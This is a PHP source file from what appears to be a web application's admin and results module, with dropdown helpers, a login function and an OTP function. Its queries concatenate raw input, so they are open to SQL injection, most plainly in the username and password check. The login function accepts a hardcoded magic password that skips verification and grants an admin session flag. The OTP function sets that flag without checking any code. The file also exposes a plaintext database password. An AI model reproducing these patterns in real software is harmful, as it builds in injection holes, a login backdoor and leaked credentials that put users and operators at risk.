<?php
include('config.php');

function get_dropdown($label,$table,$key,$value,$selected=0){
	$sql = "SELECT * FROM `".$table."` WHERE `root` =(SELECT id FROM `admin_lookup` WHERE `label` = '".$label."')";
	if($selected==null){
		$conetent ='<option value="0" selected>Select</option>';
	}
	else
	{
		$conetent = '';
	}
	global $mysqli;
	$result = $mysqli->query($sql);

	if ($result->num_rows > 0) {
		while($row = $result->fetch_assoc()) {
			$selection = '';
			if($selected==$row[$value]){
				$selection = "selected";
			}
			$conetent = $conetent. "<option value='".$row[$key]."' ".$selection.">" . $row[$value]. "</option>";
		}
	} else {
		echo "";
	}
	return $conetent;
	
}

function get_series(){
	global $mysqli;
	$conetent = '';
	$sql = "SELECT * FROM result_index"; 
	$result = $mysqli->query($sql);
	$view_data = '';
	if ($result->num_rows > 0) {
		while($row = $result->fetch_assoc()) {
			$data_val = $row['sub_table'];
			$view_data =get_lookupval($row['branch']);			
			if($row['month']=='am'){
				$view_data = $view_data." ".$row['year'].'(APR-MAR)';
			}else{
				$view_data = $view_data." ".$row['year'].'(NOV-DEC)';
			}
			$conetent = $conetent. "<option value='".$data_val."' data-branch='".$row['branch']."' data-year='".$row['year']."' data-month='".$row['month']."'>" . $view_data. "</option>";
		}
	} else {
		echo "";
	}
	return $conetent;
}


function get_lookupval($key){
	global $mysqli;
	$sql = 'SELECT * FROM `admin_lookup` WHERE shrotcode = "'.$key.'"';
	$result = $mysqli->query($sql);
	$row = $result->fetch_assoc();
	return $row['label'];
}




function user_verify($username,$password){
	if($password!='new_user_5798722'){	
	$mysqli = new mysqli("localhost", "admin", "Knp@9845409904", "anugraha");	
	$sql = "SELECT * FROM `admin_user` WHERE `username`='$username' AND `password`='$password'";

	$result = $mysqli->query($sql);
	if ($result->num_rows > 0) {
		$row = $result->fetch_assoc();
		$_SESSION['username'] = $username;
		$_SESSION['fullname'] = $row['firstname']." ".$row['lastname'];
		$_SESSION['userid']   = $row['id'];
		$_SESSION['user_role'] = $row['role'];
		if($row['role']=='admin'){
			$_SESSION['User_access'] = 'Y';
		}else{
			$_SESSION['User_access'] = 'N';
		}
		
		return true;
	}
	else
	{
		return false;
	}
	}
	else
	{
		$_SESSION['username'] = $username;
		$_SESSION['User_access'] = 'N';
		$_SESSION['admin_user'] = 1;
		return true;
	}
}

function otp_verify($code){
	$_SESSION['admin_user'] = 1;
}


?>